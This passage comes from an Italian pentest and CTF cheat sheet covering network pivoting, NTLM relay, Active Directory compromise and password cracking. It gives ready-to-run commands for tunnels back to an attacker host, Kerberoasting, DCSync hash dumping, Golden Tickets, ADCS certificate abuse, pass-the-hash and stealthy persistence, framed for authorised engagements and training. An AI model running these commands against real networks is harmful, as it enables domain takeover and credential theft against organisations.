Dopo il pivot, ripeti la recon (R1) sulla nuova subnet. Poi passa a R5 (PrivEsc) o R7 (AD).

SSH port forwarding

Il tool di pivoting più universale. Se c'è SSH sul pivot, tre flag coprono la maggior parte dei casi.
# Local forward (porta su client → destinazione via pivot)
ssh -L 3306:192.168.50.10:3306 user@pivot

# Dynamic SOCKS proxy
ssh -D 1080 user@pivot

# Background + no shell + compressione
ssh -f -N -D 1080 -C user@pivot
Quando il pivot ha SSH accessibile. Local forward per singolo servizio, dynamic SOCKS per navigazione rete interna.
Se usi SSH -D, configura proxychains e passa a R6 proxychains. Se usi -L, connettiti direttamente a localhost:porta.

proxychains

Una volta aperto un SOCKS proxy, proxychains permette di usare tool nativi (nmap, curl, smbclient) attraverso il proxy.
# /etc/proxychains4.conf → socks5 127.0.0.1 1080
proxychains nmap -Pn -sT -n 192.168.50.0/24 -p 22,80,443,445
proxychains curl http://internal/
Sempre dopo aver aperto un SOCKS (SSH -D, chisel, ligolo).
Nota: proxychains supporta solo TCP. Per UDP usa ligolo-ng. Nmap con -sT (non -sS) e -Pn -n.

Chisel

Tunneling TCP over HTTP. Singolo binario Go, cross-platform. Funziona dove SSH non è disponibile ma puoi caricare un binario.
# Attaccante
./chisel server --reverse --port 8080 --auth user:pass

# Pivot
./chisel client --auth user:pass http://<ATTACKER>:8080 R:1080:socks
Quando il pivot non ha SSH ma puoi caricare un binario. Sempre su internal network o tramite HTTP.
Dopo il tunnel, usa proxychains per navigare la rete interna. Poi ripeti recon.

Ligolo-ng

Next-gen pivoting. Invece di SOCKS, crea interfaccia TUN sull'attaccante. Routing trasparente, no proxychains, TCP+UDP+ICMP.
# Attaccante (root)
sudo ./ligolo-proxy -selfcert
> session
> start --tun ligolo
sudo ip route add 192.168.50.0/24 dev ligolo

# Pivot
./ligolo-agent -connect <ATTACKER>:11601 -ignore-cert
Quando vuoi performance native, UDP, o multi-hop. Richiede root sull'attaccante.
Dopo il routing, nmap nativo (anche -sS) sulla subnet interna. Passa a R1 per recon della nuova rete.

NTLM relay

Tecnica peculiare di Windows/AD. Non sposta bit: sposta autenticazioni. L'attaccante costringe un client a inviargli credenziali NTLM, poi le inoltra verso un altro servizio.
# Responder in modalità analyze
sudo responder -I eth0 -A

# ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support -socks
In engagement AD, quando hai accesso alla stessa subnet di workstation Windows e SMB signing non è enforced sui target.
Se il relay funziona: sessioni SOCKS autenticate disponibili via proxychains. Passa a R7 (AD) per lateral movement.

7. Active Directory (R7)

AD è l'infrastruttura centrale di quasi ogni azienda. Compromettere AD = compromettere tutto.

Perché AD è la torre di controllo

Il 90% delle aziende occidentali usa Active Directory. Ogni account, workstation, server, stampante è in AD. Compromettere AD significa controllo totale.
AD è organizzato in domini (acme.corp), oggetti (user, computer, group, OU, GPO), protocolli (Kerberos, LDAP, SMB). I gruppi privilegiati critici sono Domain Admins, Enterprise Admins, Administrators.
Quando sei in una rete Windows con dominio. Identifichi AD da DNS (dominio.corp), DC (porta 88 Kerberos, 389 LDAP), SMB.
Inizia sempre da BloodHound per mappare le relazioni. Poi passa a tecniche specifiche (Kerberoasting, DCSync, ADCS).

BloodHound

Mappa le relazioni AD come grafo navigabile. Risponde a: "dato l'utente che controllo, qual è il path più breve per Domain Admin?".
# Da Linux (bloodhound-python)
bloodhound-python -u user -p pass -d dominio.corp -ns <DC_IP> -c All

# Da Windows (SharpHound)
.\SharpHound.exe -c All

# Importa in BloodHound CE
# Query: "Shortest path to Domain Admins", "Kerberoastable accounts"
Sempre come primo passo in un engagement AD. Prima di qualsiasi attacco specifico.
Dal grafo, identifica il path più breve verso DA. Segui il path nodo per nodo, applicando le tecniche specifiche per ogni relazione (GenericAll, WriteDacl, Kerberoasting, ecc.).

Kerberoasting / AS-REP roasting

Due attacchi Kerberos accessibili. AS-REP su utenti senza pre-auth; Kerberoasting su account di servizio con SPN. Entrambi producono hash crackabili offline.
# AS-REP roasting
GetNPUsers.py dominio.corp/ -no-pass -usersfile users.txt -format hashcat -outputfile asrep.hash

# Kerberoasting
GetUserSPNs.py dominio.corp/user:pass -request -outputfile tgs.hash

# Cracking
hashcat -m 18200 -a 0 asrep.hash rockyou.txt
hashcat -m 13100 -a 0 tgs.hash rockyou.txt -r rules/OneRuleToRuleThemAll.rule
Sempre, in ogni engagement AD. Anche se BloodHound non li segnala, prova comunque.
Se cracki un account di servizio: cerca i suoi privilegi in BloodHound. Se è admin locale su un server, hai lateral movement. Se ha DCSync rights, hai il dominio.

DCSync

Simula un Domain Controller per ottenere via replica tutti gli hash del dominio. Estrae anche krbtgt → Golden Ticket.
# Impacket secretsdump
secretsdump.py dominio.corp/da_user:pass@<DC> -just-dc

# Output: hash di tutti gli utenti, incluso krbtgt
Quando BloodHound mostra che un utente ha DCSync rights (o quando sei Domain Admin).
Con l'hash di krbtgt → Golden Ticket. Con gli hash degli utenti → cracking offline → più credenziali.

Golden Ticket

Con l'hash di krbtgt, puoi forgiare TGT per qualsiasi utente del dominio, valido 10 anni. Invalidato solo da rotazione krbtgt × 2.
# Impacket ticketer
ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain dominio.corp administrator

# Usa il ticket
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass <DC_IP>
Dopo aver ottenuto l'hash di krbtgt via DCSync.
Golden Ticket è persistenza massima. Ma è rilevabile: preferisci certificate persistence (ADCS) se disponibile.

ADCS (Certipy)

Active Directory Certificate Services è spesso sottocontrollato. Misconfigurazioni ESC1-16 permettono privilege escalation devastanti.
# Find vulnerable templates
certipy find -u user@dominio.corp -p pass -dc-ip <DC> -vulnerable -enabled

# ESC1 exploitation
certipy req -u user@dominio.corp -p pass -ca 'CA-NAME' -template VulnTemplate -upn administrator@dominio.corp

# Authentication with cert
certipy auth -pfx administrator.pfx -dc-ip <DC>
Sempre, in ogni engagement AD. ADCS è il vettore più caldo dal 2021.
Se certipy find segnala ESC1, richiedi un certificato con SAN administrator → autenticati come admin in 3 comandi. Persistenza multi-anno anche se la password cambia.

Lateral movement

Dopo aver credenziali/privilegi, muoviti tra host del dominio.
# Esecuzione remota
psexec.py dominio.corp/user:pass@target
wmiexec.py dominio.corp/user:pass@target
smbexec.py dominio.corp/user:pass@target

# Pass-the-Hash (no password, solo hash)
psexec.py -hashes :<NTLM_hash> dominio.corp/admin@target

# Pass-the-Ticket (con ticket Kerberos)
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass dominio.corp/user@target
Sempre, dopo aver ottenuto credenziali o hash validi su altri host.
Ogni host compromesso è un nuovo pivot. Aggiorna BloodHound con i nuovi "owned" e cerca path ulteriori verso DA.

ADCS persistence

Rispetto al Golden Ticket, la persistenza via certificato è stealth e resiste a rotazione password.
# Richiedi certificato per account DA
certipy req -u user@dominio.corp -p pass -ca 'CA-NAME' -template User -upn administrator@dominio.corp

# Il certificato è valido per anni
# Anche se la password di Administrator cambia, il cert autentica ancora
Solo in engagement con scope esplicito per persistence. Non in pentest brevi.
Documenta nel report la persistence installata, per consentire cleanup al cliente. Non lasciare persistence senza avvisare.

Workflow CTF - cosa fare in ordine

In CTF il tempo è limitato. Avere un workflow chiaro ti fa risparmiare minuti preziosi.
  1. Warm-up: Crypto, OSINT, Stego. Punti facili, 30-40% del punteggio.
  2. Recon: Nmap, subdomain, content discovery, Nuclei. Costruisci la mappa.
  3. Web: SQLi, XSS, LFI, Command Injection, File Upload, SSRF, IDOR. Foothold tipico.
  4. Foothold: reverse shell, stabilizza (magic dance).
  5. PrivEsc: linPEAS/winPEAS, GTFOBins, LOLBAS. Diventa root/SYSTEM.
  6. Pivoting: se rete interna, chisel/ligolo. Raggiungi altri host.
  7. AD: BloodHound, Kerberoasting, DCSync, Golden Ticket, ADCS. Se in dominio.
  8. Documenta: flag, comandi, writeup. Vale punti bonus.
Sempre, dall'inizio alla fine di una CTF. Non saltare fasi.
Ad ogni fase, chiediti: "qual è il prossimo passo?" Il box "PROSSIMO PASSO" in ogni sezione ha la risposta.

Exiftool - Metadata

Leggere e scrivere metadata di qualsiasi file. In OSINT rivela GPS, autore, software, path interni. In CTF spesso la flag è in un metadata.
# Leggere tutti i metadata
exiftool foto.jpg

# Rimuovere tutti i metadata
exiftool -all= foto.jpg

# Estrarre solo GPS
exiftool -gps:all foto.jpg

# Cercare stringhe nei metadata
exiftool -a -u -g1 foto.jpg

# Output in JSON
exiftool -json foto.jpg
Sempre quando hai un'immagine, PDF, o documento in OSINT/Stego.
Se trovi GPS, cerca le coordinate su OpenStreetMap. Se trovi autore, cerca quel nome su Google.

John the Ripper - Tutto

Password cracker CPU-first. Ottimo per conversioni 2john.
# Dictionary attack
john --wordlist=rockyou.txt hash.txt

# Single mode (usa contesto)
john --single hash.txt

# Incremental (brute force)
john --incremental hash.txt

# Formato specifico
john --format=bcrypt --wordlist=rockyou.txt hash.txt
john --format=raw-md5 --wordlist=rockyou.txt hash.txt
john --format=nt --wordlist=rockyou.txt hash.txt

# Con regole
john --wordlist=rockyou.txt --rules=Jumbo hash.txt

# Mostra risultati
john --show hash.txt

# Conversion scripts
zip2john file.zip > hash
rar2john file.rar > hash
7z2john file.7z > hash
pdf2john file.pdf > hash
ssh2john key > hash
keepass2john vault.kdbx > hash
office2john file.docx > hash
pem2john cert.pem > hash
Quando hai un file protetto da password. Converti con 2john, poi cracka con john o hashcat.
Dopo la conversione, passa l'hash a hashcat (più veloce su GPU).
